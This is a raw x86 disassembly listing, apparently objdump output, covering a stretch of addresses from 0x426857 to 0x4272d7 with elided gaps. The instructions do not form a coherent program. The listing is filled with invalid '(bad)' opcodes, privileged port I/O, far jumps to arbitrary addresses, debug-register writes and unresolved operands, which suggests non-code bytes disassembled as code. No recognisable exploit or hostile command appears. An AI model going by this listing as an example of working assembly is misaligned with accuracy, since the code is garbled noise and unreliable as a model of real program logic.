  426857:	fistp  DWORD PTR [edx-0x1]
  42685a:	in     al,0xbe
  42685c:	test   al,0x23
  42685e:	mov    al,ah
  426860:	inc    ebx
  426861:	mov    al,ds:0xb5769031
  426866:	mov    al,0xaa
  426868:	and    BYTE PTR [ecx],ch
  42686a:	add    DWORD PTR [esi+ecx*2],esi
  42686d:	adc    al,0x7c
  42686f:	ret    
  426870:	lds    ecx,FWORD PTR [ebx-0xb]
  426873:	je     0x4267f5
  426875:	enter  0x16e4,0x77
  426879:	fisub  DWORD PTR [ebp-0xffeda68]
  42687f:	lods   al,BYTE PTR ds:[esi]
  426880:	ja     0x426817
  426882:	inc    ecx
  426883:	jp     0x4268dc
  426885:	jno    0x42685e
  426887:	dec    ebp
  426888:	lods   eax,DWORD PTR ds:[esi]
  426889:	xor    ah,BYTE PTR [ebp+0xb]
  42688c:	inc    esp
  42688d:	sbb    al,0xa0
  42688f:	enter  0x6950,0x45
  426893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426894:	imul   edx,DWORD PTR [esi+ebp*2-0x9c3d5ff],0xffffff86
  42689c:	xor    eax,0xd2e0b4f3
  4268a1:	dec    esp
  4268a2:	ds add al,0x4
  4268a5:	dec    esp
  4268a6:	or     bh,BYTE PTR [ebp-0x45]
  4268a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268aa:	dec    ecx
  4268ab:	repnz adc esp,DWORD PTR [ecx-0x18f94e34]
  4268b2:	inc    edx
  4268b3:	mov    DWORD PTR [edi+0x19a6563],edi
  4268b9:	aaa    
  4268ba:	bound  esi,QWORD PTR ds:0x824eb5d3
  4268c0:	cmp    al,0x73
  4268c2:	and    al,0x42
  4268c4:	or     eax,0x8b58fcac
  4268c9:	jno    0x426881
  4268cb:	les    eax,FWORD PTR [esi]
  4268cd:	push   edx
  4268ce:	ins    BYTE PTR es:[edi],dx
  4268cf:	dec    esi
  4268d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268d1:	je     0x4268dd
  4268d3:	(bad)  
  4268d4:	mov    edx,0xda5fc07d
  4268d9:	mov    eax,ds:0xb3c7b6ed
  4268de:	test   WORD PTR [ebx+0x4c],di
  4268e2:	mov    bh,0xb1
  4268e4:	pop    es
  4268e5:	nop
  4268e6:	rcl    BYTE PTR [edi-0x7f],0xc6
  4268ea:	in     al,0x4b
  4268ec:	pop    esi
  4268ed:	pop    ecx
  4268ee:	sub    DWORD PTR [ebp+0x6a],ebx
  4268f1:	repz imul BYTE PTR [ebx]
  4268f4:	dec    esp
  4268f5:	in     eax,0xd2
  4268f7:	popf   
  4268f8:	cmp    al,0x4c
  4268fa:	mov    ebp,0x13318459
  4268ff:	cld    
  426900:	xchg   edx,eax
  426901:	jp     0x42689b
  426903:	lods   al,BYTE PTR ds:[esi]
  426904:	jb     0x426968
  426906:	mov    ebx,0x19494607
  42690b:	ins    BYTE PTR es:[edi],dx
  42690c:	cmp    eax,0x1e3fb2d7
  426911:	xchg   edx,eax
  426912:	data16 aaa 
  426914:	mov    DWORD PTR [edx+0x527de5b9],edx
  42691a:	aad    0x78
  42691c:	push   es
  42691d:	aad    0xe2
  42691f:	lods   al,BYTE PTR ds:[esi]
  426920:	or     BYTE PTR es:[edx],0x2b
  426924:	inc    esp
  426925:	int3   
  426926:	add    al,0x92
  426928:	mov    ebp,0x7707c3b9
  42692d:	jno    0x4268f1
  42692f:	call   0xd321:0x94aa31ca
  426936:	jmp    0xbc8ea86b
  42693b:	frstor [ebp+eax*4+0xb9d4e9]
	...
  4269b2:	add    BYTE PTR [eax],al
  4269b4:	shl    DWORD PTR [ebx+0x4],0x67
  4269b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269b9:	jcxz   0x4269a3
  4269bc:	jne    0x426978
  4269be:	push   ebp
  4269bf:	inc    esp
  4269c0:	or     ah,BYTE PTR [edx-0x13]
  4269c3:	xor    al,0x6d
  4269c5:	call   0x0:0xf50001
  4269cc:	scas   al,BYTE PTR es:[edi]
  4269cd:	leave  
  4269ce:	add    ah,al
  4269d0:	das    
  4269d1:	ret    
  4269d2:	in     al,0x9b
  4269d4:	add    esp,edx
  4269d6:	mov    ah,0xbe
  4269d8:	or     eax,0x6c1d7772
  4269dd:	add    esp,0x19
  4269e0:	mov    dl,0x7c
  4269e2:	xchg   DWORD PTR [ecx+0x32ade3b9],esi
  4269e8:	xchg   ebx,eax
  4269e9:	lahf   
  4269ea:	mov    WORD PTR [ebp+0x18cff842],?
  4269f0:	call   0x145c49b9
  4269f5:	or     dh,ch
  4269f7:	jmp    0x426a6a
  4269f9:	push   esp
  4269fa:	push   ebx
  4269fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269fc:	les    eax,FWORD PTR [esi]
  4269fe:	jnp    0x426a1d
  426a00:	push   0xb1f6fd05
  426a05:	mov    eax,0xe74dcce1
  426a0a:	sub    eax,0x284fbbef
  426a0f:	cmc    
  426a10:	push   esp
  426a11:	and    DWORD PTR [eax-0x3ea01324],edx
  426a17:	xchg   ebp,eax
  426a18:	jnp    0x42699d
  426a1a:	push   esi
  426a1b:	outs   dx,BYTE PTR cs:[esi]
  426a1d:	jl     0x426a58
  426a1f:	pop    ds
  426a20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a21:	mov    esp,ecx
  426a23:	je     0x4269ce
  426a25:	push   0x7c
  426a27:	dec    ebp
  426a28:	inc    ebp
  426a29:	scas   al,BYTE PTR es:[edi]
  426a2a:	push   esi
  426a2b:	inc    ebx
  426a2c:	ins    DWORD PTR es:[edi],dx
  426a2d:	mov    ?,ebp
  426a2f:	mov    bl,0xdc
  426a31:	xchg   edi,eax
  426a32:	cli    
  426a33:	rol    DWORD PTR [esi-0x17896ed3],cl
  426a39:	les    edx,FWORD PTR [edi-0x5b80c630]
  426a3f:	dec    esp
  426a40:	jb     0x426a15
  426a42:	jl     0x426a91
  426a44:	arpl   bp,ax
  426a46:	data16 addr16 jne 0x426a95
  426a4a:	push   ds
  426a4b:	lods   al,BYTE PTR ds:[esi]
  426a4c:	and    eax,0x7a1aabc0
  426a51:	stc    
  426a52:	mov    dh,0xbe
  426a54:	shl    DWORD PTR ds:0x4729ff49,0x51
  426a5b:	dec    ebx
  426a5c:	push   ebp
  426a5e:	or     eax,0xc2739dbf
  426a63:	sub    al,0x17
  426a65:	fisub  DWORD PTR [esi]
  426a67:	lea    edi,[esi+0x5c]
  426a6a:	sub    al,0xdc
  426a6c:	cmc    
  426a6d:	bound  edx,QWORD PTR [edx]
  426a6f:	pop    esp
  426a70:	pop    esp
  426a71:	xchg   DWORD PTR [ebx],ecx
  426a73:	mov    WORD PTR [ebx+ecx*8-0x2821a162],fs
  426a7a:	idiv   dh
  426a7c:	cmp    DWORD PTR [edi+0x37],edx
  426a7f:	cmp    BYTE PTR [edi-0x78],dh
  426a82:	adc    BYTE PTR [edi+edx*8+0x57dc59f9],cl
  426a89:	or     DWORD PTR [eax],ecx
  426a8b:	gs cs ins DWORD PTR es:[edi],dx
  426a8e:	sbb    DWORD PTR [edx-0x5568c9c6],esp
  426a94:	ss std 
  426a96:	je     0x426ad5
  426a98:	hlt    
  426a99:	sbb    eax,DWORD PTR [edi-0xe3b0976]
  426a9f:	and    al,0x99
  426aa1:	xor    BYTE PTR [edx+0x20],bh
  426aa4:	mov    BYTE PTR [ebx+0x44e03886],0xd3
  426aab:	sub    esi,DWORD PTR ss:[edx]
  426aae:	push   0xffffffcb
  426ab0:	std    
  426ab1:	xor    DWORD PTR [esi-0x6c265206],ebx
  426ab7:	jne    0x426ae8
  426ab9:	lea    edx,[ecx+0x33f709ab]
  426abf:	iret   
	...
  426b34:	(bad)  
  426b35:	clc    
  426b36:	jnp    0x426b8e
  426b38:	jg     0x426b11
  426b3a:	in     eax,dx
  426b3b:	cli    
  426b3c:	cwde   
  426b3d:	inc    ebx
  426b3e:	mov    dh,0x90
  426b40:	xchg   esi,eax
  426b41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426b42:	cmp    edx,ecx
  426b44:	bound  ebx,QWORD PTR [ebx+0xf50001]
  426b4a:	add    BYTE PTR [eax],al
  426b4c:	jno    0x426b0e
  426b4e:	push   edi
  426b4f:	sub    BYTE PTR ds:[edx],ah
  426b52:	mov    ah,dh
  426b54:	or     ebp,DWORD PTR [ebx]
  426b56:	mov    al,0xda
  426b58:	aas    
  426b59:	or     eax,0x5735865
  426b5e:	xchg   esp,eax
  426b5f:	test   DWORD PTR [ecx-0x6830b7ea],edi
  426b65:	daa    
  426b66:	sbb    BYTE PTR [eax-0x10],0x87
  426b6a:	fwait
  426b6b:	ror    DWORD PTR [edi+0x38],1
  426b6e:	cmp    edi,eax
  426b70:	je     0x426b67
  426b72:	and    eax,edx
  426b74:	adc    BYTE PTR [edi+0x1d],ch
  426b77:	fprem  
  426b79:	xchg   edi,eax
  426b7a:	scas   al,BYTE PTR es:[edi]
  426b7b:	sbb    al,BYTE PTR [ecx+0x7f]
  426b7e:	bound  edx,QWORD PTR [ebx-0x3cc58214]
  426b84:	jge    0x426bcb
  426b86:	ins    DWORD PTR es:[edi],dx
  426b87:	mov    WORD PTR [edi],?
  426b89:	leave  
  426b8a:	addr16 pushf 
  426b8c:	add    esp,DWORD PTR [esi+0x1]
  426b8f:	add    eax,0xe22a602c
  426b94:	retf   0x9809
  426b97:	sbb    DWORD PTR ds:0xd0cc8e50,0x1b3d4ffe
  426ba1:	push   esi
  426ba2:	data16 and BYTE PTR [edi+0x65],dl
  426ba6:	std    
  426ba7:	push   ebp
  426ba8:	fs and al,0xe5
  426bab:	xlat   BYTE PTR ds:[ebx]
  426bac:	iret   
  426bad:	dec    ebp
  426bae:	jae    0x426b79
  426bb0:	outs   dx,DWORD PTR ds:[esi]
  426bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bb2:	xchg   esi,eax
  426bb3:	loope  0x426b97
  426bb5:	and    BYTE PTR [ecx+0x1d24fc94],ah
  426bbb:	mov    DWORD PTR [eax],edi
  426bbd:	sub    cl,BYTE PTR [eax]
  426bbf:	push   ss
  426bc0:	xchg   ebp,eax
  426bc1:	push   eax
  426bc2:	test   al,0xd5
  426bc4:	sbb    ch,cl
  426bc6:	pop    ss
  426bc7:	int    0x10
  426bc9:	clc    
  426bca:	jnp    0x426beb
  426bcc:	retf   0x5889
  426bcf:	mov    dl,0x2b
  426bd1:	scas   al,BYTE PTR es:[edi]
  426bd2:	in     eax,dx
  426bd3:	mov    eax,ds:0x64d09981
  426bd8:	mov    ebx,0x69813fad
  426bdd:	leave  
  426bde:	push   es
  426bdf:	sti    
  426be0:	adc    ah,BYTE PTR [esi+ecx*8]
  426be3:	je     0x426bff
  426be5:	outs   dx,BYTE PTR ds:[esi]
  426be6:	(bad)  
  426be7:	in     eax,0xee
  426be9:	outs   dx,BYTE PTR ds:[esi]
  426bea:	std    
  426beb:	cwde   
  426bec:	dec    ecx
  426bed:	xchg   BYTE PTR [ebx],dh
  426bef:	movzx  ebx,WORD PTR [edi+0x10fc413a]
  426bf6:	ja     0x426c19
  426bf8:	dec    edi
  426bf9:	add    al,0x4b
  426bfb:	jnp    0x426bf9
  426bfd:	mov    bh,0x14
  426bff:	cld    
  426c00:	lods   eax,DWORD PTR ds:[esi]
  426c01:	sti    
  426c02:	ss mov edi,ebx
  426c05:	stos   DWORD PTR es:[edi],eax
  426c06:	sbb    BYTE PTR [ebp-0x1b],0x3c
  426c0a:	lods   al,BYTE PTR ds:[esi]
  426c0b:	xchg   DWORD PTR [esi],edx
  426c0d:	sub    eax,0x769fbb6d
  426c12:	jnp    0x426c25
  426c14:	cs call WORD PTR cs:[ecx+ebx*2]
  426c1a:	jmp    0xb82695a7
  426c1f:	xchg   edx,eax
  426c20:	ja     0x426bdf
  426c22:	out    dx,al
  426c23:	(bad)  
  426c24:	pusha  
  426c25:	xchg   ebp,eax
  426c26:	cmp    BYTE PTR [ebx-0x7820db16],0x7d
  426c2d:	(bad)  
  426c2e:	mov    WORD PTR [esp+eax*4],?
  426c31:	sub    al,0xe5
  426c33:	mov    ecx,0xfc956f4a
  426c38:	dec    ebp
  426c39:	xchg   esi,eax
  426c3a:	in     eax,dx
  426c3b:	iret   
  426c3c:	cmp    esp,DWORD PTR ds:0xbbb566
	...
  426cb2:	add    BYTE PTR [eax],al
  426cb4:	jmp    FWORD PTR [esp+ebx*8-0x8820f9]
  426cbb:	cld    
  426cbc:	inc    eax
  426cbd:	push   ds
  426cbe:	cdq    
  426cbf:	das    
  426cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426cc1:	imul   eax,DWORD PTR [ecx+0x19c5796],0xf500
  426ccb:	add    bh,al
  426ccd:	xchg   ebx,eax
  426cce:	clc    
  426ccf:	inc    esp
  426cd0:	ret    0x1f77
  426cd3:	mov    al,0x47
  426cd5:	out    dx,eax
  426cd6:	mov    BYTE PTR [esi+ebp*2+0x5b],0xac
  426cdb:	repnz arpl WORD PTR [ecx-0x3621fa19],ax
  426ce2:	shr    BYTE PTR [esp+esi*1],cl
  426ce5:	and    ebp,esi
  426ce7:	test   al,0x6
  426ce9:	sub    esp,DWORD PTR [ebp-0x3d1dc973]
  426cef:	bound  esi,QWORD PTR [edi-0x1cfd9dc5]
  426cf5:	push   esi
  426cf6:	xor    edi,DWORD PTR [edx+esi*1]
  426cf9:	pop    edx
  426cfa:	ins    DWORD PTR es:[edi],dx
  426cfb:	pop    ss
  426cfc:	jp     0x426cd7
  426cfe:	push   edi
  426cff:	daa    
  426d00:	lea    ebx,[edi]
  426d02:	pop    ecx
  426d03:	xor    cl,BYTE PTR [eax-0x3c24b85]
  426d09:	sub    ch,BYTE PTR [ebx+0x13]
  426d0c:	loop   0x426d23
  426d0e:	test   BYTE PTR [eax],0xa5
  426d11:	dec    esp
  426d12:	aaa    
  426d13:	or     BYTE PTR [edi],dl
  426d15:	pop    edx
  426d16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d17:	gs addr16 std 
  426d1a:	pop    ss
  426d1b:	hlt    
  426d1c:	jnp    0x426cf8
  426d1e:	adc    eax,0x2e
  426d21:	and    al,0x75
  426d23:	jne    0x426cc7
  426d25:	ja     0x426cf4
  426d27:	or     cl,BYTE PTR [ecx+0x6838eb8e]
  426d2d:	ret    
  426d2e:	rol    DWORD PTR ds:[ebx-0x544bd945],0x66
  426d36:	les    esi,FWORD PTR [ecx]
  426d38:	xor    al,0xdc
  426d3a:	xchg   edx,eax
  426d3b:	(bad)
  426d3e:	xchg   DWORD PTR [edi-0x52],esp
  426d41:	mov    DWORD PTR [eax+edx*1-0x7a],ebx
  426d45:	mov    ebx,0x291bdfb8
  426d4a:	xchg   edi,eax
  426d4b:	jg     0x426d5c
  426d4d:	push   esi
  426d4e:	add    DWORD PTR [ecx+edx*2-0x2f1afc79],ebx
  426d55:	xlat   BYTE PTR ds:[ebx]
  426d56:	cmp    eax,0xcdd14dff
  426d5b:	and    eax,0xd6c5c0cd
  426d60:	xchg   ebx,eax
  426d61:	pop    ebp
  426d62:	push   edx
  426d63:	mov    ds:0x5b7dd662,al
  426d68:	dec    esi
  426d69:	jb     0x426d69
  426d6b:	repz push esp
  426d6d:	cmp    eax,0x5c30b0dc
  426d72:	lods   al,BYTE PTR ds:[esi]
  426d73:	xchg   esp,eax
  426d74:	ret    
  426d75:	mov    dl,0x40
  426d77:	ret    
  426d78:	fsub   QWORD PTR [edx+ebx*2]
  426d7b:	outs   dx,DWORD PTR ds:[esi]
  426d7c:	mov    cl,0x66
  426d7e:	mov    dl,0xf4
  426d80:	sbb    edi,DWORD PTR [ecx-0x1a]
  426d83:	popf   
  426d84:	mov    al,ch
  426d86:	popf   
  426d87:	cmp    ebx,esp
  426d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d8a:	push   ecx
  426d8b:	sub    ebx,DWORD PTR [edx-0x5e33eef2]
  426d91:	je     0x426d14
  426d93:	xchg   edx,eax
  426d94:	adc    al,0x5
  426d96:	mov    ecx,0xc26835c
  426d9b:	or     dh,BYTE PTR [esi+0x11]
  426d9e:	xchg   BYTE PTR [esi],ch
  426da0:	cmp    esp,DWORD PTR [edx-0x7260aad6]
  426da6:	clc    
  426da7:	aas    
  426da8:	cmp    cl,BYTE PTR [edi]
  426daa:	je     0x426da6
  426dac:	ret    
  426dad:	xlat   BYTE PTR ds:[ebx]
  426dae:	xor    eax,DWORD PTR [ebp-0x7e]
  426db1:	pop    ecx
  426db2:	sub    DWORD PTR [eax],esi
  426db4:	hlt    
  426db5:	jae    0x426e08
  426db7:	pop    edi
  426db8:	cli    
  426db9:	mov    ah,0xda
  426dbb:	fnstenv [ecx]
  426dbd:	ficomp DWORD PTR [edx+0x3297]
	...
  426e33:	add    dh,al
  426e35:	jl     0x426e88
  426e37:	sar    bl,1
  426e39:	std    
  426e3a:	(bad)  
  426e3b:	jle    0x426df9
  426e3d:	(bad)  
  426e3e:	loop   0x426e84
  426e40:	cmp    ah,dl
  426e42:	outs   dx,DWORD PTR ds:[esi]
  426e43:	adc    eax,0x19d4c
  426e48:	cmc    
  426e49:	add    BYTE PTR [eax],al
  426e4b:	add    BYTE PTR [edi+0x2f],ah
  426e4e:	pop    edx
  426e4f:	add    ah,BYTE PTR [eax]
  426e51:	loope  0x426e95
  426e53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e54:	mov    edx,0x390078e6
  426e59:	call   0xb1f0:0xbc4207b0
  426e60:	fadd   QWORD PTR [ecx+0xa42f1d4]
  426e66:	cwde   
  426e67:	mov    ds:0xe172307,eax
  426e6c:	hlt    
  426e6d:	dec    esp
  426e6e:	cmp    eax,0x3c3c8a74
  426e73:	addr16 out 0x15,al
  426e76:	(bad)  
  426e77:	push   edi
  426e78:	pminsw mm7,QWORD PTR [edi-0x55aed4f8]
  426e7f:	mov    db4,ecx
  426e82:	ja     0x426eb7
  426e84:	push   edi
  426e85:	mov    ch,0xa7
  426e87:	jle    0x426ed4
  426e89:	or     edi,DWORD PTR [edx+0x7efbfad8]
  426e8f:	mov    BYTE PTR [edi],ch
  426e91:	adc    al,0x48
  426e93:	bound  esi,QWORD PTR [ebx+0x243f4a1c]
  426e99:	add    cl,al
  426e9b:	and    eax,0x6285155c
  426ea0:	mov    ebp,0xd1340dfe
  426ea5:	out    dx,eax
  426ea6:	push   edi
  426ea7:	add    bl,ch
  426ea9:	mov    ah,0x48
  426eab:	mov    al,BYTE PTR [ebp+0x4c]
  426eae:	scas   eax,DWORD PTR es:[edi]
  426eaf:	nop
  426eb0:	add    al,dh
  426eb2:	fdivrp st(1),st
  426eb4:	and    BYTE PTR [esi],dh
  426eb6:	mov    dl,0x1e
  426eb8:	jns    0x426e6e
  426eba:	cmp    bl,0xa9
  426ebd:	repnz pop ds
  426ebf:	inc    esi
  426ec0:	xor    al,0xed
  426ec2:	leave  
  426ec3:	gs iret 
  426ec5:	into   
  426ec6:	ret    0x79d
  426ec9:	das    
  426eca:	je     0x426ec9
  426ecc:	cmc    
  426ecd:	adc    edi,DWORD PTR [ecx-0x246e9da4]
  426ed3:	shl    BYTE PTR [ecx-0x217310de],0x57
  426eda:	adc    esp,DWORD PTR [ebx+0x74381091]
  426ee0:	push   es
  426ee1:	repnz fdivr QWORD PTR [edi-0x486bfba9]
  426ee8:	aaa    
  426ee9:	fbstp  TBYTE PTR [eax-0xc]
  426eec:	stc    
  426eed:	or     DWORD PTR [esi+0x4c85be75],0xc81f54a1
  426ef7:	adc    dh,bh
  426ef9:	in     eax,0xbb
  426efb:	inc    edi
  426efc:	bound  esi,QWORD PTR [esi-0x5ee607a7]
  426f02:	ss scas eax,DWORD PTR es:[edi]
  426f04:	mov    ds:0xcc768bfe,eax
  426f09:	inc    edx
  426f0a:	dec    ebx
  426f0b:	mov    dl,0x87
  426f0d:	sub    DWORD PTR [edi+0xf],ebx
  426f10:	lahf   
  426f11:	mov    esi,0xb6331fc4
  426f16:	iret   
  426f17:	add    al,BYTE PTR [ebx]
  426f19:	jb     0x426f94
  426f1b:	ins    DWORD PTR es:[edi],dx
  426f1c:	mov    eax,ds:0x17e4ba96
  426f21:	inc    esp
  426f22:	int    0xe3
  426f24:	call   0xd411:0x8e5c9a96
  426f2b:	addr16 push ebx
  426f2d:	ficomp WORD PTR [si]
  426f30:	scas   eax,DWORD PTR es:[edi]
  426f31:	adc    bl,bh
  426f33:	pop    esi
  426f34:	mov    ch,0x35
  426f36:	mov    bh,0xdc
  426f38:	jge    0x426f3a
  426f3a:	xor    dl,dh
  426f3c:	push   ebp
  426f3d:	leave  
  426f3e:	(bad)  
  426f3f:	not    dl
	...
  426fb1:	add    BYTE PTR [eax],al
  426fb3:	add    BYTE PTR [ecx],bh
  426fb5:	cwde   
  426fb6:	or     eax,DWORD PTR [esi]
  426fb8:	stos   DWORD PTR es:[edi],eax
  426fb9:	xchg   edi,eax
  426fba:	cmp    eax,0xcc7989bf
  426fbf:	pop    ebx
  426fc0:	add    al,al
  426fc2:	push   es
  426fc3:	fild   WORD PTR [ecx-0x62]
  426fc6:	add    DWORD PTR [eax],eax
  426fc8:	cmc    
  426fc9:	add    BYTE PTR [eax],al
  426fcb:	add    BYTE PTR [esi],bh
  426fcd:	aas    
  426fce:	cmc    
  426fcf:	mov    ds:0x1600e89a,al
  426fd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426fd6:	sbb    DWORD PTR [edx-0x11c81176],0xfffffff3
  426fdd:	cmp    al,0x10
  426fdf:	(bad)  
  426fe0:	adc    BYTE PTR [esi],dl
  426fe2:	cmp    dl,BYTE PTR [ebx+ecx*8]
  426fe5:	mov    edi,0xef0d2756
  426fea:	in     al,0xd6
  426fec:	daa    
  426fed:	mov    ds:0x96af130c,al
  426ff2:	pop    ecx
  426ff3:	add    ebx,esi
  426ff5:	ins    DWORD PTR es:[edi],dx
  426ff6:	adc    BYTE PTR ds:0xa1e65597,dh
  426ffc:	jmp    0x8942:0x7bda1ae4
  427003:	rcl    BYTE PTR [ecx-0x756b93a9],0x34
  42700a:	sub    cl,BYTE PTR [eax-0x19]
  42700d:	xchg   ebx,eax
  42700e:	mov    al,0x53
  427010:	in     eax,dx
  427011:	mov    bh,0x25
  427013:	cli    
  427014:	or     al,0x7f
  427016:	dec    ebp
  427017:	xchg   ecx,eax
  427018:	loopne 0x427096
  42701a:	addr16 inc ecx
  42701c:	or     dh,bl
  42701e:	shr    BYTE PTR [edx+0x2b],cl
  427021:	(bad)  
  427022:	push   esp
  427023:	stc    
  427024:	sub    eax,0x2fae5a56
  427029:	xor    BYTE PTR ds:0x116c00a8,bl
  42702f:	mov    edx,0xdfdc8ff5
  427034:	xchg   ebx,eax
  427035:	ins    DWORD PTR es:[edi],dx
  427036:	mov    cl,0xee
  427038:	cld    
  427039:	js     0x4270aa
  42703b:	pop    esi
  42703c:	fldenv ds:0x9c3ae80c
  427042:	pusha  
  427043:	inc    ebp
  427044:	jl     0x4270b3
  427046:	popa   
  427047:	in     eax,0x57
  427049:	sbb    ebx,DWORD PTR [esi+0x7dc54e3a]
  42704f:	mov    eax,ds:0xfadafc54
  427054:	add    BYTE PTR [ebp+0x55],dh
  427057:	fcmovne st,st(4)
  427059:	pop    eax
  42705a:	xchg   edi,eax
  42705b:	sub    eax,0xfbbd797e
  427060:	xchg   DWORD PTR [eax-0x80],esp
  427063:	xchg   ebx,eax
  427064:	mov    ebx,0xdb129304
  427069:	test   al,0x1d
  42706b:	es jne 0x427052
  42706e:	in     al,dx
  42706f:	mov    edi,0x520a02f6
  427074:	sti    
  427075:	or     edx,DWORD PTR [ebx]
  427077:	sub    ah,BYTE PTR [ecx+eax*1-0x69fdf0e]
  42707e:	xlat   BYTE PTR ds:[ebx]
  42707f:	cmp    ebx,DWORD PTR [eax+0xc]
  427082:	or     DWORD PTR [edi+ecx*1+0x15],edi
  427086:	adc    dl,BYTE PTR [ebx+edx*2]
  427089:	shr    ecx,1
  42708b:	sbb    DWORD PTR [edx],esp
  42708d:	loopne 0x42709e
  42708f:	in     eax,dx
  427090:	ficomp DWORD PTR [esi-0x5f]
  427093:	inc    ecx
  427094:	fbld   TBYTE PTR [ebp-0x4c]
  427097:	adc    al,0x29
  427099:	out    dx,eax
  42709a:	in     eax,dx
  42709b:	enter  0x231d,0xd8
  42709f:	pop    ds
  4270a0:	adc    eax,0xf65ee151
  4270a5:	out    0xac,al
  4270a7:	inc    esp
  4270a8:	nop
  4270a9:	sub    BYTE PTR [ebx+0xa],al
  4270ac:	push   edi
  4270ad:	xchg   ebp,eax
  4270ae:	daa    
  4270af:	mov    ah,BYTE PTR [esi+0x619d1c51]
  4270b5:	and    al,0x51
  4270b7:	jbe    0x427070
  4270b9:	jp     0x4270fc
  4270bb:	or     eax,0x167d92e5
  4270c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  427131:	add    BYTE PTR [eax],al
  427133:	add    BYTE PTR [ebx-0x409ef0df],bl
  427139:	outs   dx,DWORD PTR ds:[esi]
  42713a:	(bad)  
  42713b:	sti    
  42713c:	into   
  42713d:	aad    0x24
  42713f:	aam    0xb
  427141:	mov    bl,0x33
  427143:	xor    DWORD PTR [esi],esi
  427145:	lahf   
  427146:	add    DWORD PTR [eax],eax
  427148:	cmc    
  427149:	add    BYTE PTR [eax],al
  42714b:	add    BYTE PTR [ecx-0x5860487f],bl
  427151:	mov    cl,0xda
  427153:	add    ecx,ebp
  427155:	stc    
  427156:	ja     0x4271d5
  427158:	nop
  427159:	gs mov al,0x77
  42715c:	mov    edx,DWORD PTR [esp+esi*1-0x61d86fa7]
  427163:	mov    DWORD PTR [esi],eax
  427165:	fisubr WORD PTR ds:0x535163a
  42716b:	xlat   BYTE PTR ds:[ebx]
  42716c:	push   ecx
  42716d:	mov    edx,0xac17a511
  427172:	and    BYTE PTR [ebp-0x49],bl
  427175:	inc    ebp
  427176:	es mov cl,0xa0
  427179:	imul   eax,DWORD PTR [edi],0xffffffa2
  42717c:	jle    0x4271aa
  42717e:	xchg   edi,eax
  42717f:	push   cs
  427180:	gs fs push edx
  427183:	std    
  427184:	(bad)  
  427186:	mov    ch,BYTE PTR [eax-0x4c1ebfdc]
  42718c:	pop    es
  42718d:	scas   al,BYTE PTR es:[edi]
  42718e:	sbb    BYTE PTR [esi-0x8],ah
  427191:	shr    BYTE PTR [edx],1
  427193:	out    dx,al
  427194:	(bad)  
  427195:	sti    
  427196:	push   eax
  427197:	push   esi
  427198:	gs xchg edx,eax
  42719a:	call   FWORD PTR [bp+di+0x40ee]
  42719f:	jp     0x4271e8
  4271a1:	sub    esi,edi
  4271a3:	cmp    al,0x92
  4271a5:	mov    eax,ds:0x62d3731a
  4271aa:	mov    ds:0x826654a5,al
  4271af:	mov    dh,0xfc
  4271b1:	dec    edi
  4271b2:	or     bl,BYTE PTR [esi]
  4271b4:	imul   eax,DWORD PTR [ebp-0x13df5b7d],0x586c8a86
  4271be:	pop    eax
  4271bf:	xlat   BYTE PTR ds:[ebx]
  4271c0:	(bad)  
  4271c1:	xchg   esp,eax
  4271c2:	retf   
  4271c3:	pop    esp
  4271c4:	pop    ebp
  4271c5:	repz push esi
  4271c7:	loope  0x427239
  4271c9:	sti    
  4271ca:	mov    BYTE PTR [esi],ch
  4271cc:	add    al,BYTE PTR [ebx+0x205cdae5]
  4271d2:	sub    al,0xd2
  4271d4:	iret   
  4271d5:	or     DWORD PTR [esi+0x71f91da6],ebx
  4271db:	add    ebp,edi
  4271dd:	int    0x84
  4271df:	xchg   edi,eax
  4271e0:	test   eax,0x8c45761e
  4271e5:	mov    esi,0x9e283247
  4271ea:	out    0x35,eax
  4271ec:	enter  0x4d07,0x31
  4271f0:	not    ebp
  4271f2:	popf   
  4271f3:	sub    al,0x5c
  4271f5:	inc    ebp
  4271f6:	retf   
  4271f7:	(bad)  
  4271f8:	mov    ebx,ds
  4271fa:	jno    0x427225
  4271fc:	or     al,0x56
  4271fe:	ret    
  4271ff:	jmp    0x9060:0x2839830b
  427206:	cmp    ecx,DWORD PTR [edx+0x4bd9c705]
  42720c:	int3   
  42720d:	inc    ebp
  42720e:	xchg   esi,eax
  42720f:	arpl   WORD PTR [edi-0x7a],cx
  427212:	cwde   
  427213:	popa   
  427214:	arpl   WORD PTR [edi+0x66],di
  427217:	test   BYTE PTR [ecx-0x2d],dh
  42721a:	fldcw  WORD PTR [edx+esi*1]
  42721d:	je     0x427217
  42721f:	mov    al,ds:0xcc48a469
  427224:	div    DWORD PTR [ecx-0x30]
  427227:	rcr    BYTE PTR [ebx-0x37e2881e],0xf2
  42722e:	xchg   esp,eax
  42722f:	or     eax,0xe67a4cb
  427234:	enter  0x4d2,0x95
  427238:	add    BYTE PTR [ecx-0x43e7bb0e],0x22
  42723f:	add    DWORD PTR ds:[eax],0x0
	...
  4272b3:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  4272b7:	dec    esi
  4272b8:	std    
  4272b9:	out    dx,al
  4272ba:	xlat   BYTE PTR ds:[ebx]
  4272bb:	aas    
  4272bc:	jle    0x427280
  4272be:	ds jmp 0xe53770a7
  4272c4:	sub    esp,DWORD PTR [eax+0xf50001]
  4272ca:	add    BYTE PTR [eax],al
  4272cc:	push   ebx
  4272cd:	jo     0x4272f7
  4272cf:	into   
  4272d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272d1:	jecxz  0x42731f
  4272d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4272d4:	popf   
  4272d5:	dec    edx
  4272d6:	lods   al,BYTE PTR ds:[esi]
  4272d7:	stos   DWORD PTR es:[edi],eax
